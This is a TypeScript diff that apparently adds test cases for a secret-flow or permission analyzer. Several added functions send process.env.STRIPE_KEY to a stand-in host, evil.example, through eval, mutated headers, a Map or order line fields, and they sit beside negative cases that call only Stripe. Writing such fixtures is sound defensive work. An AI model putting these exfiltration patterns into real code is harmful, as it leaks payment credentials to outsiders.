@@ -126,3 +126,82 @@ export async function refund(amount: number) {
   await audit(amount);
   await fetch("https://analytics.example/refund");
 }
+
+/** @perm-unsafe reason:"template compiler, trusted templates only" */
+function render(template: string): unknown {
+  return eval(template);
+}
+
+/** @perm-unsafe accepts render's eval for annotations, but it runs whatever it's given, the key included. */
+export function viaUnsafe() {
+  const key = process.env.STRIPE_KEY;
+  render("fetch('https://evil.example/?k=" + key + "')");
+}
+
+// --- Data handed back through an object the caller passes in.
+
+/** Writes the key into the headers it's given: its caller then has the key. */
+function authorize(headers: Record<string, string>): void {
+  headers.authorization = `Bearer ${process.env.STRIPE_KEY}`;
+}
+
+export async function viaHeaders() {
+  const headers: Record<string, string> = {};
+  authorize(headers);
+  await fetch("https://evil.example/report", { method: "POST", headers });
+}
+
+/** Hands the key to a method of the object it's given. */
+function loadInto(store: Map<string, string>): void {
+  store.set("key", process.env.STRIPE_KEY!);
+}
+
+export async function viaStore() {
+  const store = new Map<string, string>();
+  loadInto(store);
+  await fetch("https://evil.example/store", { method: "POST", body: store.get("key") });
+}
+
+interface Order {
+  id: string;
+  total: number;
+  lines: { sku: string; note?: string }[];
+}
+
+/** Writes the key into the elements of a list it's given, through a callback. */
+function tagLines({ lines }: Order): void {
+  lines.forEach((line) => {
+    line.note = process.env.STRIPE_KEY;
+  });
+}
+
+export async function viaElements(order: Order) {
+  tagLines(order);
+  await fetch("https://evil.example/lines", { method: "POST", body: JSON.stringify(order) });
+}
+
+/** Only reads what it's given, and returns nothing: nothing comes back to its caller. */
+async function chargeOrder(order: Order): Promise<void> {
+  if (!order || order.total <= 0) return;
+  const skus = order.lines.map((line) => line.sku).join(",");
+  await fetch("https://api.stripe.com/v1/charges", {
+    method: "POST",
+    headers: { authorization: `Bearer ${process.env.STRIPE_KEY}` },
+    body: `${order.id}:${order.total}:${skus}:${order.id.toUpperCase()}`,
+  });
+}
+
+export async function checkoutOrder(order: Order) {
+  await chargeOrder(order);
+  await fetch("https://analytics.example/checkout");
+}
+
+/** A logger that takes a string can't hand anything back. */
+function logCharge(message: string): void {
+  void fetch("https://api.stripe.com/v1/log", { method: "POST", headers: { authorization: `Bearer ${process.env.STRIPE_KEY}` }, body: message });
+}
+
+export async function logged() {
+  logCharge("charged");
+  await fetch("https://analytics.example/logged");
+}
